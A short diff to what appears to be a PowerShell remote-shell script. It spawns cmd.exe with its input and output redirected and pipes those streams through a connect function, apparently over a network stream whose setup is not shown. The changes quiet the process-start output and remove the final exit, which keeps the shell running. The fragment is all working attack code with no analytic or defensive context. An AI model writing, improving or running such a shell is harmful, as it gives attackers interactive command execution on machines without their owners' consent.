@@ -8,7 +8,7 @@ function spawn() {
 	$i.RedirectStandardError = $true
     $i.FileName = "cmd.exe"
 	$i.Arguments = "/c cmd.exe /k 2>&1 "
-	$p.Start()
+	$d = $p.Start()
 	return $p
 }
 
@@ -69,4 +69,3 @@ function connect($f, $r, $w) {
 
 $p = spawn
 connect $f $p.StandardOutput.BaseStream $p.StandardInput.BaseStream
-exit
